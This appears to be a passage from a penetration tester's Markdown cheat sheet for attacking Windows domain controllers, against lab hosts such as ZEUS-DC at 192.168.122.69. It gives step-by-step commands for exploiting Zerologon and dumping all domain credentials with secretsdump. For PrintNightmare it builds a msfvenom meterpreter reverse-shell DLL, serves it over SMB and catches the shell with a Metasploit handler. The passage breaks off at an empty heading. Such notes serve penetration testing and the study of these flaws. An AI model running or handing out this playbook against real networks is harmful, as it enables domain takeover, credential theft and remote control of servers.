`python3 zerologon_tester.py ZEUS-DC 192.168.122.69`

### attack
https://github.com/dirkjanm/CVE-2020-1472
`python3 cve-2020-1472-exploit.py ZEUS-DC 192.168.122.69`

### secretsdump
`secretsdump -just-dc <domain>/<dc_hostname>\$@<dc_ip>`
e.g.
`secretsdump -just-dc ATLANTIS.local/ZEUS-DC\$@192.168.122.69`
without any password we can get all credentials

### restore null password
Use administrator ntlm hash from secrestsdump and try another secretsdump:
`secretsdump administrator@<dc_ip> -hashes <local_admin_ntlm_hash>`
which will get the following:
```
<domain>\<dc_hostname>$:plain_password_hex:<dc_device_hex_pass>
```
Use the hex value to restore the password:
```
python3 restorepassword.py <domain>/<dc_hostname>@<dc_hostname> -target-ip <dc_ip> -hexpass <dc_device_hex_pass>
```

## PrintNightmare
#print_nightmare
CVE-2021-1675 / CVE-2021-34527
https://github.com/cube0x0/CVE-2021-1675
https://github.com/calebstewart/CVE-2021-1675

### 1. check if domain controller is vulnerable
#rpcdump
command:
`rpcdump.py @<domain_controller_ip>  | egrep 'MS-RPRN|MS-PAR'`
Output:
```
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol 
```
this output means the domain controller is vulnerable
### 2. install specific version of impacket
#impacket
```
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

### 3. generate payload
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f dll > <shell.dll>
```

### 4. host payload using metasploit
```
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
# set LHOST and LPORT (same used in building the payload)
```

### 5. smb share the malicious dll using impacket
```
smbserver.py <share_name> `pwd` -smb2support
^ part of impacket
					^ current dir
```
###  6. run the script
Usage:
```
CVE-2021-1675.py [-h] [-hashes LMHASH:NTHASH] [-target-ip ip address] [-port [destination port]] target share
```
Command:
`python3 CVE-2021-1675.py <domain>/<user>:<pass>@<dc_server> '\\<smbhost>\<share_name>\<shell.dll>'`
Example:
`python3 CVE-2021-1675.py atlantis.local/jackc:'Password12345!'@192.168.122.69 '\\192.168.122.142\share\shell.dll'`
Output:
- hashes will be dumped in the smb hosting console (step 5)
- meterpreter shell will be spawned (step 4)
## Sam the Admin
#sam_the_admin

